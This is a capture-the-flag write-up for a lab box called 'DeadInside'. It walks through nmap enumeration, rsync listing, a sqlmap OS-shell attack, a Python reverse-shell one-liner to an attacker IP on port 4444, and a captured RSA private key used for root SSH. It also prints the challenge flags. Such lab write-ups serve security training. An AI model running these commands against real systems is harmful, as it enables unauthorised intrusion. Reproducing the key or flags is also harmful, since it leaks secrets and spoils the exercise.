# DeadInside

## Enumeration
```bash
└─$ nmap -A -p- -sC -T4 10.10.250.34 -oX nmap.out
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 11:10 BST
Nmap scan report for 10.10.250.34
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Exploitation

### I download all the files that I found

```bash
└─$ rsync -av --list-only rsync://10.10.250.34:873/
Conf All Confs

└─$ rsync -av --list-only rsync://10.10.250.34:873/Conf/
...
access.conf

└─$ rsync -av --list-only rsync://10.10.250.34:873/Conf/access.conf access.conf
cat access.conf 
```
### I've changed the contents of the webapp.ini file because on the website it says something like "keep the door closed" and in the file a door field is here with writing closed.
```python
webapp.ini

door = opened
```

### Exploit the sql database to got a shell as rick

sqlmap -u http://10.10.250.34/door/config.php --level 5 --risk 3 --batch -D db --os-shell --forms
```bash
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.37.214",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### upload pentestMonkey in the box, reverseshell to get a shell as rick

## User FLAG

```cat /home/rick/user.txt``` : EPI{W3_r_73h_w4lk1n9_D34D}

## Privilege Escalation

### linpeas = tcpdump

tcpdump -i lo -w file.cap
```bash
cat file.cap :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtb/gJ/0hjWELlcYLzexponv3FWbz1r4g9w4htwEWqvbFfoxb
JKPi0xzn+gTEqi8I0uKW+gILfRG03gtv2RrMYPNK2exLuWqnb9ZPyLD3xETtollU
lR5DbWiEAtIFLOItdtXrP7hF0fi2Vc3H+4bFEhLPHzgwH068Xs5n+YviOFz4XOtW
DZOEA6XrpqcxPaMhksCcTPi9clvrioOyKEpnXTXQzWuma0pckclYvbh4vEwQp5n0
/rpgEMT7MRMT3CsDEfZOS2oAOfswc9WzDlbrQ7ghuHk2EMHrA/sI5M0N4GWeE12v
lld3CAKWp9MkB9g84qJdmt5QFk4tLYh08qaaeQIDAQABAoIBAHww5oysrXab73yi
XYKSnwQGTSn0tX3xYTkwEN2qAsFD6mO0qLr6uY2kXOc8xt27Uf44Ew42w37s0HhB
vGXPqAQ/etA6ZOwH8u26tb3fHw6gQvkCrYdPrKdgGYSL2jl3O7XOKvfZhOwbVQyA
lrxKtPLKo3kjvc5G0PS/edDNQwFbbjA0zf43GOFfW/ahOQu82iVfkDtrjmTnqB5/
O4pjmkNuTR9E6BStL5vZJoLK0W5lc9bgHa1TgyRzkK8iKKen+kohWrJUjQnK0f8z
/LTZuNwuOWZ60ckaQPJhAqdRbXOJ5gm0r9hStSN+ncKOYlLSdFz9Opskp4aDTGQa
zEzzjGECgYEA6VFeVzL2UcP+JCgtpBZHpRNUiCO7yjvfLFIeeDJKY1sKefLSz4mb
KiSFodWf1nsZydhRM25pXWfk17X7up/ocgs8gCkOQAiYM8AkzZ60egiehPD4Pv4h
cPJMSNEoq1cTlOJFmmPMk5dwj8kp12IkSgFNlLRd7vD9yVJbkC1MP20CgYEAx2sd
awpIu7T4P+ttFGQi+/nrNNTZ4fr9IrMK7VObuF9HG3YH3t1DkEOqk5zerYVVP9J5
bIbsSv9dBysWqe6Ftrtzrk5bhpRIy4E/etEoMGqzmMA1SZkI8P5E9AzN/F03C2xq
p9s2fexqdf5RpdGujpSJda0fZki01jDznHUjg70CgYEAmk0zxRtxB5ZE5wijVpdd
fnCQQRDQyuhZqegNOpSX2amF/ix2+sYYlgBdWC/9a00yOukSmp70k8936qjx9/R1
N6bythdw0yxb7C2wqUPCO8qje2wZ4R8UYqv7g1TAPsBxtM8IFRjXXOyUhqMVRtoj
AcZm1meKj9FVJeWPpIQwnukCgYB7UGN6o3tih3/TlvN23o07n8mwe8bYFOqfoHOr
Wj46/r/r3Ur0p4J2HUHH0gNo7cBPnQl08OIBZnPSUPTM1DBfVP8t1EqIp/1zylLE
0b22YuT4GjNZdYav76wX9isSWVoGeF5jugyyRZV3rXIzxbvZc0SlPg7ioycgJFkg
cNcrSQKBgB2vGOzFapRM2zfukNXmtHLrO/+U6yXwj+VuJtDO/lwdORCaQGNEobs4
U8NEWvUEM0vdvJCKwpFLK784YKug4LUhJlc1DYRYxF9Ct+er/mQKuFd/tiSvKoqz
gOFPkMMr6+LJjvzfFZqaGwHFuT0W44THPSRNfuWaoTqnF/7KhrWy
-----END RSA PRIVATE KEY-----

chmod 600 id_rsa
ssh -i id_rsa root@<IP>

cd /root
```
## Root FLAG

```cat root.txt``` : EPI{9R0w1N9_Up_12_93771n9_u53D_70_73H_W0rld}

### Write up to help me for the box
source : https://related.cupprs.com/metamorphosis/
